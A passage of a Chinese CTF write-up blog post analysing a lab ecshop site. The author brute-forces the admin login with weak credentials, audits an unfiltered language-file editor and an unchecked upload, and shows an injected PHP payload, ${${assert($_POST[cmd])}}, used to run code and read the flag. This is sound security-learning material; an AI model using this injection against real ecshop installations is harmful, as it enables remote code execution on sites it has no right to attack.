class="keyword">$this</span>-&gt;display();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到没对上传的文件进行后缀验证，可造成任意文件上传。直接getshell。</p>
+<h2 id="粤湾租赁"><a href="#粤湾租赁" class="headerlink" title="粤湾租赁"></a>粤湾租赁</h2><p>地址： <a href="http://172.16.9.41:9008/" target="_blank" rel="noopener">http://172.16.9.41:9008/</a> </p>
+<p>一个ecshop的商城框架，版本还挺新的。(里面的商品都是小米的？？？) 界面如下：</p>
+<p><img src="C:\Users\ThreeZhi\AppData\Roaming\Typora\typora-user-images\image-20191123155227208.png" alt="image-20191123155227208"></p>
+<p>跟第二题一样的，爆破进入后台。</p>
+<p>用户名：admin</p>
+<p>密码：admin123</p>
+<p>进来后台可以查到最近文件的修改记录，直接看到了edit_languages.php在最近有修改过，于是直接就去审它了。</p>
+<p>漏洞点：\admin\edit_languages.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($_REQUEST[<span class="string">'act'</span>] == <span class="string">'edit'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 语言项的路径 */</span></span><br><span class="line">    $lang_file = <span class="keyword">isset</span>($_POST[<span class="string">'file_path'</span>]) ? trim($_POST[<span class="string">'file_path'</span>]) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 替换前的语言项 */</span></span><br><span class="line">    $src_items = !<span class="keyword">empty</span>($_POST[<span class="string">'item'</span>]) ? stripslashes_deep($_POST[<span class="string">'item'</span>]) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 修改过后的语言项 */</span></span><br><span class="line">    $dst_items = <span class="keyword">array</span>();</span><br><span class="line">    $_POST[<span class="string">'item_id'</span>] = stripslashes_deep($_POST[<span class="string">'item_id'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($_POST[<span class="string">'item_id'</span>]); $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 语言项内容如果为空，不修改 */</span></span><br><span class="line">        <span class="keyword">if</span> (trim($_POST[<span class="string">'item_content'</span>][$i]) == <span class="string">''</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">unset</span>($src_items[$i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $_POST[<span class="string">'item_content'</span>][$i] = str_replace(<span class="string">'\\\\n'</span>, <span class="string">'\\n'</span>, $_POST[<span class="string">'item_content'</span>][$i]);</span><br><span class="line">            $dst_items[$i] = $_POST[<span class="string">'item_id'</span>][$i] .<span class="string">' = '</span>. <span class="string">'"'</span> .$_POST[<span class="string">'item_content'</span>][$i]. <span class="string">'";'</span>;</span><br><span class="line"><span class="comment">//            $dst_items[$i] = $_POST['item_id'][$i] .' = '. '\'' .$_POST['item_content'][$i]. '\';';</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用函数编辑语言项 */</span></span><br><span class="line">    $result = set_language_items($lang_file, $src_items, $dst_items);</span><br></pre></td></tr></table></figure>
+<p>可以看到从post中获取到的file_path和item传入到了set_language_items。</p>
+<p>跟踪过去：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_language_items</span><span class="params">($file_path, $src_items, $dst_items)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 检查文件是否可写（修改） */</span></span><br><span class="line">    <span class="keyword">if</span> (file_mode_info($file_path) &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取文件内容 */</span></span><br><span class="line">    $line_array = file($file_path);</span><br><span class="line">    <span class="keyword">if</span> (!$line_array)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $file_content = implode(<span class="string">''</span>, $line_array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $snum = count($src_items);</span><br><span class="line">    $dnum = count($dst_items);</span><br><span class="line">    <span class="keyword">if</span> ($snum != $dnum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 对索引进行排序，防止错位替换 */</span></span><br><span class="line">    ksort($src_items);</span><br><span class="line">    ksort($dst_items);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $snum; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $file_content = str_replace($src_items[$i], $dst_items[$i], $file_content);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 写入修改后的语言项 */</span></span><br><span class="line">    $f = fopen($file_path, <span class="string">'wb'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$f)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!fwrite($f, $file_content))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到并未对写入的内容做严格的过滤。</p>
+<p>拿flag的步骤：</p>
+<p>进入到模板管理 =&gt; 语言项编辑 =&gt; 选择user.php =&gt; 搜索 用户信息</p>
+<p>将内容用户信息处修改为：<code>${${assert($_POST[cmd])}}</code></p>
+<p>当时蚁剑连接user.php没有成功。使用了另外一种方式：</p>
+<p>POST数据：<code>cmd=hightlight_file($_GET[a])</code>，传入一个<code>a=/flag</code>读取到的flag。</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/10/07/OKLite 1.2.25 几处getshell审计分析/" rel="next" title="OKLite 1.2.25 几处getshell审计分析">
+                  <i class="fa fa-chevron-left"></i> OKLite 1.2.25 几处getshell审计分析
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/12/18/论如何优雅的复制一个网站的所有页面/" rel="prev" title="Python之如何优雅的复制一个网站的所有页面">
+                  Python之如何优雅的复制一个网站的所有页面 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc">
+            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#粤湾基金"><span class="nav-number">1.</span> <span class="nav-text">粤湾基金</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#粤湾期货"><span class="nav-number">2.</span> <span class="nav-text">粤湾期货</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#粤湾投资"><span class="nav-number">3.</span> <span class="nav-text">粤湾投资</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#粤湾租赁"><span class="nav-number">4.</span> <span class="nav-text">粤湾租赁</span></a></li></ol></div>
+          </div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Threezh1</p>
+  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">schlagwörter</span>
+        
+      </div>
+    
+  </nav>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+    
+  </div>
+
+
+
+        </div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Threezh1</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  </div>
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
+<script src="/js/schemes/pisces.js?v=7.3.0"></script>
+<script src="/js/next-boot.js?v=7.3.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <script src="/js/post-details.js?v=7.3.0"></script>
+
+
+</body>
+</html>
